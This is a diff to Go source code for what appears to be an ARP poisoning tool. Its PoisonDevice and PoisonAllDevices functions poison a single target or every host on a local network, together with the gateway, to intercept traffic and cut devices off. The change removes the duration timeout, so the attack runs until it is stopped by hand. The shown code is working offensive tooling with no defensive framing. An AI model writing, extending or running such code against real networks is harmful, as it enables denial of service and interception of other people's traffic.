@@ -132,17 +132,11 @@ func ScanNetwork() ([]Host, *net.Interface, net.IP, error) {
 
 // PoisonDevice performs ARP poisoning to cut off a target device from the network
 // It poisons both the target and the gateway to intercept all traffic between them
-func PoisonDevice(targetIP, gatewayIP net.IP, targetMAC, gatewayMAC net.HardwareAddr, iface *net.Interface, duration time.Duration, stopChan <-chan struct{}) error {
+func PoisonDevice(targetIP, gatewayIP net.IP, targetMAC, gatewayMAC net.HardwareAddr, iface *net.Interface, stopChan <-chan struct{}) error {
 	fmt.Printf("\n[*] Starting ARP poisoning attack\n")
 	fmt.Printf("[*] Target: %s (%s)\n", targetIP, targetMAC)
 	fmt.Printf("[*] Gateway: %s (%s)\n", gatewayIP, gatewayMAC)
 	fmt.Printf("[*] Attacker MAC: %s\n", iface.HardwareAddr)
-
-	if duration > 0 {
-		fmt.Printf("[*] Duration: %s\n", duration)
-	} else {
-		fmt.Printf("[*] Duration: indefinite (press Ctrl+C to stop)\n")
-	}
 
 	// Open pcap handle
 	handle, err := pcap.OpenLive(iface.Name, 65536, false, 500*time.Millisecond)
@@ -164,11 +158,6 @@ func PoisonDevice(targetIP, gatewayIP net.IP, targetMAC, gatewayMAC net.Hardware
 	ticker := time.NewTicker(1 * time.Second)
 	defer ticker.Stop()
 
-	var timeoutChan <-chan time.Time
-	if duration > 0 {
-		timeoutChan = time.After(duration)
-	}
-
 	fmt.Println("[*] Poisoning started... Target should lose connectivity")
 
 	packetCount := 0
@@ -176,9 +165,6 @@ func PoisonDevice(targetIP, gatewayIP net.IP, targetMAC, gatewayMAC net.Hardware
 		select {
 		case <-stopChan:
 			fmt.Printf("\n[*] Received stop signal. Sent %d poison packets.\n", packetCount)
-			return nil
-		case <-timeoutChan:
-			fmt.Printf("\n[*] Duration expired. Sent %d poison packets.\n", packetCount)
 			return nil
 		case <-ticker.C:
 			// Send poison to target
@@ -196,17 +182,11 @@ func PoisonDevice(targetIP, gatewayIP net.IP, targetMAC, gatewayMAC net.Hardware
 
 // PoisonAllDevices poisons all devices on the network simultaneously
 // Each device is poisoned in its own goroutine
-func PoisonAllDevices(hosts []Host, gatewayIP net.IP, gatewayMAC net.HardwareAddr, myIP net.IP, iface *net.Interface, duration time.Duration, stopChan <-chan struct{}) error {
+func PoisonAllDevices(hosts []Host, gatewayIP net.IP, gatewayMAC net.HardwareAddr, myIP net.IP, iface *net.Interface,  stopChan <-chan struct{}) error {
 	fmt.Printf("\n[*] Starting MASS ARP poisoning attack\n")
 	fmt.Printf("[*] Gateway: %s (%s)\n", gatewayIP, gatewayMAC)
 	fmt.Printf("[*] Attacker MAC: %s\n", iface.HardwareAddr)
 	fmt.Printf("[*] Targets: %d devices\n", len(hosts)-2) // Exclude self and gateway
-
-	if duration > 0 {
-		fmt.Printf("[*] Duration: %s\n", duration)
-	} else {
-		fmt.Printf("[*] Duration: indefinite (press Ctrl+C to stop)\n")
-	}
 
 	// Open pcap handle
 	handle, err := pcap.OpenLive(iface.Name, 65536, false, 500*time.Millisecond)
@@ -253,11 +233,6 @@ func PoisonAllDevices(hosts []Host, gatewayIP net.IP, gatewayMAC net.HardwareAdd
 	ticker := time.NewTicker(1 * time.Second)
 	defer ticker.Stop()
 
-	var timeoutChan <-chan time.Time
-	if duration > 0 {
-		timeoutChan = time.After(duration)
-	}
-
 	fmt.Printf("\n[*] Poisoning started... %d devices should lose connectivity\n", len(targets))
 
 	packetCount := 0
@@ -265,9 +240,6 @@ func PoisonAllDevices(hosts []Host, gatewayIP net.IP, gatewayMAC net.HardwareAdd
 		select {
 		case <-stopChan:
 			fmt.Printf("\n[*] Received stop signal. Sent %d poison packets to %d targets.\n", packetCount, len(targets))
-			return nil
-		case <-timeoutChan:
-			fmt.Printf("\n[*] Duration expired. Sent %d poison packets to %d targets.\n", packetCount, len(targets))
 			return nil
 		case <-ticker.C:
 			// Send poison packets to all targets
